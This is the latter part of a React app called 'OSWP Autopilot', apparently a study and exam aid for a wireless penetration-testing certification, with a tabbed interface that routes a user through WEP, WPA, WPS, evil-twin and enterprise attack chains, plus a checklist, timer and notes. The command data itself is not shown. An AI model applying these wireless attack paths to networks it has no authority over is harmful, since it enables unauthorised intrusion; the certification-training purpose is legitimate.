.tab{padding:8px 12px;font-size:11px;font-weight:600;font-family:var(--s);color:var(--t2);background:none;border:none;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s}
.tab:hover{color:var(--t1)}.tab.on{color:var(--ac);border-bottom-color:var(--ac);background:var(--b2)}
.main{flex:1;padding:14px 16px;max-width:1100px;margin:0 auto;width:100%}
.phase{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:10px;overflow:hidden}
.phase-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:background .1s}
.phase-h:hover{background:var(--b3)}
.phase-num{width:26px;height:26px;border-radius:6px;background:var(--acd);border:1px solid var(--ac);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;color:var(--ac);flex-shrink:0}
.phase-num.done{background:var(--g);border-color:var(--g);color:#fff}
.phase-title{font-size:13px;font-weight:700;color:var(--t0)}
.phase-desc{font-size:11px;color:var(--t2)}
.steps-wrap{border-top:1px solid var(--bd)}
.step{border-bottom:1px solid var(--bd)}.step:last-child{border-bottom:none}
.step-row{padding:8px 14px;display:flex;align-items:flex-start;gap:8px;cursor:pointer;transition:background .1s}
.step-row:hover{background:var(--b3)}
.snum{width:20px;height:20px;border-radius:50%;background:var(--b0);border:1px solid var(--bd);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:var(--t2);flex-shrink:0;margin-top:1px;transition:all .15s}
.snum.crit{border-color:var(--ac);color:var(--ac);background:var(--acd)}
.snum.done{border-color:var(--g);color:#fff;background:var(--g)}
.s-act{font-size:12px;font-weight:600;color:var(--t0)}.s-chk{font-size:10px;color:var(--t2);margin-top:1px}
.s-exp{background:var(--b0);margin:0 10px 10px 42px;border-radius:5px;border:1px solid var(--bd);padding:8px 10px}
.cmd{font-family:var(--m);font-size:11px;color:var(--cg);white-space:pre-wrap;word-break:break-all;line-height:1.65}
.cp{background:var(--b3);border:1px solid var(--bd);border-radius:3px;padding:2px 8px;font-size:9px;color:var(--t2);cursor:pointer;font-family:var(--m);flex-shrink:0;transition:all .15s}
.cp:hover{border-color:var(--ac);color:var(--ac)}.cp.ok{border-color:var(--g);color:var(--g)}
.arrow{font-size:9px;color:var(--t2);transition:transform .2s;flex-shrink:0}.arrow.open{transform:rotate(90deg)}
.sec-title{font-size:12px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin:16px 0 10px}
.chk-item{display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:4px;cursor:pointer;font-size:11.5px;transition:background .1s}
.chk-item:hover{background:var(--b3)}.chk-item.done{color:var(--g);opacity:.6;text-decoration:line-through}
.chk-box{width:15px;height:15px;border-radius:3px;border:1.5px solid var(--bd);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:9px;transition:all .15s}
.chk-box.on{background:var(--ac);border-color:var(--ac);color:#fff}
.prog{height:3px;background:var(--b3);border-radius:2px;margin-bottom:14px;overflow:hidden}
.prog-fill{height:100%;border-radius:2px;transition:width .3s}
.notes{width:100%;min-height:500px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;padding:14px;color:var(--t0);font-family:var(--m);font-size:11.5px;line-height:1.8;resize:vertical;outline:none}
.notes:focus{border-color:var(--ac)}
.timer-bar{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:14px;margin-bottom:14px}
.timer-display{font-family:var(--m);font-size:28px;font-weight:700;color:var(--t0);text-align:center;margin-bottom:8px}
.timer-btns{display:flex;gap:6px;justify-content:center;margin-bottom:10px}
.timer-btn{padding:5px 14px;font-size:11px;font-weight:600;border-radius:4px;border:1px solid var(--bd);background:var(--b3);color:var(--t1);cursor:pointer;font-family:var(--s);transition:all .15s}
.timer-btn:hover{border-color:var(--ac);color:var(--ac)}
.timer-btn.active{background:var(--ac);border-color:var(--ac);color:#fff}
.milestone{display:flex;gap:10px;align-items:flex-start;padding:6px 0;font-size:11px}
.mile-h{font-family:var(--m);font-weight:700;color:var(--ac);min-width:40px;flex-shrink:0}
.mile-t{color:var(--t1)}
.mile-now{color:var(--g);font-weight:600}
.qref-card{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:8px 12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:all .15s;margin-bottom:4px}
.qref-card:hover{border-color:var(--ac);background:var(--b3)}
.score-bar{display:flex;gap:4px;margin-bottom:14px;flex-wrap:wrap}
.score-seg{flex:1;padding:6px 8px;border-radius:4px;font-size:10px;font-weight:600;text-align:center;cursor:default;min-width:120px}
.decision-box{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:16px;margin-bottom:14px}
.decision-box h3{color:var(--ac);font-size:14px;margin-bottom:12px}
.decision-btn{display:block;width:100%;padding:10px 14px;margin-bottom:6px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;color:var(--t0);font-family:var(--s);font-size:12px;font-weight:600;cursor:pointer;text-align:left;transition:all .15s}
.decision-btn:hover{border-color:var(--ac);background:var(--acd)}
.decision-btn.active{border-color:var(--ac);background:var(--acd);color:var(--ac)}
`;

// ━━━ UTILITY COMPONENTS ━━━
function CopyBtn({text}){
  const[c,setC]=useState(false);
  return <button className={`cp ${c?'ok':''}`} onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(text);setC(true);setTimeout(()=>setC(false),1200)}}>{c?'✓':'Copy'}</button>
}

function PhaseList({phases,prefix}){
  const[openPhase,setOpenPhase]=useState({0:true});
  const[openSteps,setOpenSteps]=useState({});
  const[doneSteps,setDoneSteps]=useState({});
  const tP=k=>setOpenPhase(p=>({...p,[k]:!p[k]}));
  const tS=k=>setOpenSteps(p=>({...p,[k]:!p[k]}));
  const tD=(k,e)=>{e.stopPropagation();setDoneSteps(p=>({...p,[k]:!p[k]}))};

  return(<div>{phases.map((phase,pi)=>{
    const isOpen=openPhase[pi]!==false;
    const phaseDone=phase.steps.every((_,si)=>doneSteps[`${prefix}-${pi}-${si}`]);
    return(<div className="phase" key={pi}>
      <div className="phase-h" onClick={()=>tP(pi)}>
        <div className={`phase-num ${phaseDone?'done':''}`}>{phaseDone?'✓':pi+1}</div>
        <div style={{flex:1}}><div className="phase-title">{phase.phase}</div><div className="phase-desc">{phase.desc}</div></div>
        <span className={`arrow ${isOpen?'open':''}`}>▶</span>
      </div>
      {isOpen&&<div className="steps-wrap">{phase.steps.map((step,si)=>{
        const k=`${prefix}-${pi}-${si}`;const isExp=openSteps[k];const isDone=doneSteps[k];
        const cmdText=step.cmd();
        return(<div className="step" key={si}>
          <div className="step-row" onClick={()=>tS(k)}>
            <div className={`snum ${isDone?'done':step.critical?'crit':''}`} onClick={e=>tD(k,e)}>{isDone?'✓':si+1}</div>
            <div style={{flex:1}}><div className="s-act">{step.action}</div><div className="s-chk">→ {step.check}</div></div>
            <CopyBtn text={cmdText}/>
          </div>
          {isExp&&<div className="s-exp"><div className="cmd">{cmdText}</div></div>}
        </div>)
      })}</div>}
    </div>)
  })}</div>)
}

// ━━━ TAB: DECISION ENGINE ━━━
function DecisionTab(){
  const[mode,setMode]=useState(null);
  const allChains={
    setup:SETUP_CHAIN, wep:WEP_CHAIN, wpa:WPA_CHAIN,
    rogue:ROGUE_AP_CHAIN, enterprise:ENTERPRISE_CHAIN,
    wps:WPS_CHAIN, extra:EXTRA_ATTACKS
  };
  const labels={
    setup:"📡 Setup & Recon", wep:"🔓 WEP Cracking", wpa:"🔑 WPA/WPA2 PSK",
    rogue:"👿 Evil Twin & Rogue AP", enterprise:"🏢 WPA Enterprise",
    wps:"📌 WPS Attacks", extra:"🛠️ Advanced Techniques"
  };

  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)'}}>3 Network Scenarios</div>
      <div className="score-seg" style={{background:'var(--gd)',color:'var(--g)'}}>Must crack 2 of 3 (1 mandatory)</div>
      <div className="score-seg" style={{background:'rgba(234,179,8,.1)',color:'var(--y)'}}>3h45m exam + 24h report</div>
    </div>

    <div className="decision-box">
      <h3>📡 What encryption did you identify?</h3>
      <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>Select the attack path based on your airodump-ng recon. Always start with Setup & Recon.</p>
      {Object.entries(labels).map(([k,v])=>(
        <button key={k} className={`decision-btn ${mode===k?'active':''}`} onClick={()=>setMode(k)}>{v}</button>
      ))}
    </div>

    {!mode && <PhaseList phases={SETUP_CHAIN} prefix="setup"/>}
    {mode && <PhaseList phases={allChains[mode]} prefix={mode}/>}
  </div>)
}

// ━━━ TAB: QUICK REFERENCE ━━━
function QuickRefTab(){
  const[openS,setOpenS]=useState({});
  return(<div>
    {Object.entries(QUICK_REF).map(([cat,cmds])=>(
      <div key={cat}>
        <div className="sec-title">{cat}</div>
        {cmds.map((c,i)=>{
          const k=`${cat}-${i}`;const isO=openS[k];
          return(<div key={i}>
            <div className="qref-card" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
              <span style={{fontSize:11,fontWeight:600,color:'var(--t0)'}}>{c.l}</span>
              <CopyBtn text={c.c}/>
            </div>
            {isO&&<div className="s-exp" style={{margin:'0 0 8px 0'}}><div className="cmd">{c.c}</div></div>}
          </div>)
        })}
      </div>
    ))}
  </div>)
}

// ━━━ TAB: CHECKLIST ━━━
function ChecklistTab(){
  const[checked,setChecked]=useState({});
  const toggle=k=>setChecked(p=>({...p,[k]:!p[k]}));
  const total=Object.values(CHECKLIST).flat().length;
  const done=Object.values(checked).filter(Boolean).length;
  const pct=total>0?Math.round(done/total*100):0;

  return(<div>
    <div style={{fontSize:11,color:'var(--t2)',marginBottom:6}}>{done}/{total} completed ({pct}%)</div>
    <div className="prog"><div className="prog-fill" style={{width:`${pct}%`,background:pct>=100?'var(--g)':pct>=70?'var(--y)':'var(--ac)'}}/></div>
    {Object.entries(CHECKLIST).map(([section,items])=>(
      <div key={section}>
        <div className="sec-title">{section}</div>
        {items.map((item,i)=>{
          const k=`${section}-${i}`;const on=checked[k];
          return(<div key={i} className={`chk-item ${on?'done':''}`} onClick={()=>toggle(k)}>
            <div className={`chk-box ${on?'on':''}`}>{on?'✓':''}</div>
            <span>{item}</span>
          </div>)
        })}
      </div>
    ))}
  </div>)
}

// ━━━ TAB: TIMER ━━━
function TimerTab(){
  const[running,setRunning]=useState(false);
  const[elapsed,setElapsed]=useState(0);
  const intervalRef=useRef(null);

  const start=()=>{if(!running){setRunning(true);intervalRef.current=setInterval(()=>setElapsed(e=>e+1),1000)}};
  const pause=()=>{setRunning(false);clearInterval(intervalRef.current)};
  const reset=()=>{setRunning(false);clearInterval(intervalRef.current);setElapsed(0)};
  useEffect(()=>()=>clearInterval(intervalRef.current),[]);

  const hrs=Math.floor(elapsed/3600);const mins=Math.floor((elapsed%3600)/60);const secs=elapsed%60;
  const display=`${String(hrs).padStart(2,'0')}:${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
  const totalSec=3*3600+45*60;const remaining=Math.max(0,totalSec-elapsed);
  const rH=Math.floor(remaining/3600);const rM=Math.floor((remaining%3600)/60);const rS=remaining%60;
  const remDisplay=`${String(rH).padStart(2,'0')}:${String(rM).padStart(2,'0')}:${String(rS).padStart(2,'0')}`;
  const elapsedHours=elapsed/3600;

  return(<div>
    <div className="timer-bar">
      <div style={{fontSize:10,color:'var(--t2)',textAlign:'center',marginBottom:4}}>EXAM TIME (3h 45min)</div>
      <div className="timer-display">{display}</div>
      <div style={{fontSize:12,color:remaining<=900?'var(--r)':'var(--t2)',textAlign:'center',marginBottom:8}}>Remaining: {remDisplay}</div>
      <div className="prog"><div className="prog-fill" style={{width:`${Math.min(100,elapsed/totalSec*100)}%`,background:remaining<=900?'var(--r)':remaining<=1800?'var(--y)':'var(--ac)'}}/></div>
      <div className="timer-btns">
        <button className={`timer-btn ${running?'active':''}`} onClick={start}>▶ Start</button>
        <button className="timer-btn" onClick={pause}>⏸ Pause</button>
        <button className="timer-btn" onClick={reset}>↺ Reset</button>
      </div>
    </div>
    <div className="sec-title">Milestones</div>
    {MILESTONES.map((m,i)=>{
      const passed=elapsedHours>=m.hour;
      const next=i<MILESTONES.length-1?MILESTONES[i+1]:null;
      const isCurrent=elapsedHours>=m.hour&&(!next||elapsedHours<next.hour);
      return(<div className="milestone" key={i}>
        <div className="mile-h">{m.hour}h</div>
        <div className={`mile-t ${isCurrent?'mile-now':''}`} style={{opacity:passed&&!isCurrent?.5:1}}>{isCurrent?'👉 ':''}{m.label}</div>
      </div>)
    })}
  </div>)
}

// ━━━ TAB: NOTES ━━━
function NotesTab(){
  const[notes,setNotes]=useState(()=>localStorage.getItem('oswp-notes')||`# OSWP Exam Notes\n\n## Network 1 (Mandatory)\nType: \nBSSID: \nChannel: \nEncryption: \nKey Found: \n\n## Network 2\nType: \nBSSID: \nChannel: \nEncryption: \nKey Found: \n\n## Network 3\nType: \nBSSID: \nChannel: \nEncryption: \nKey Found: \n\n## Credentials Found\n\n## Screenshots Taken\n`);
  useEffect(()=>{localStorage.setItem('oswp-notes',notes)},[notes]);
  return(<div>
    <p style={{fontSize:10,color:'var(--t2)',marginBottom:8}}>Notes are saved to your browser automatically.</p>
    <textarea className="notes" value={notes} onChange={e=>setNotes(e.target.value)} spellCheck={false}/>
  </div>)
}

// ━━━ MAIN APP ━━━
const TABS=["🎯 Decision Engine","⚡ Quick Ref","✅ Checklist","⏱ Timer","📝 Notes"];

function App(){
  const[tab,setTab]=useState(0);

  return(<>
    <style>{CSS}</style>
    <div className="app">
      <div className="hdr">
        <div><div className="logo">OSWP Autopilot</div><div className="logo-sub">PEN-210 • Wireless Attack Engine</div></div>
      </div>
      <div className="tabs">{TABS.map((t,i)=><button key={i} className={`tab ${tab===i?'on':''}`} onClick={()=>setTab(i)}>{t}</button>)}</div>
      <div className="main">
        {tab===0&&<DecisionTab/>}
        {tab===1&&<QuickRefTab/>}
        {tab===2&&<ChecklistTab/>}
        {tab===3&&<TimerTab/>}
        {tab===4&&<NotesTab/>}
      </div>
    </div>
  </>)
}

ReactDOM.createRoot(document.getElementById('root')).render(<App/>);

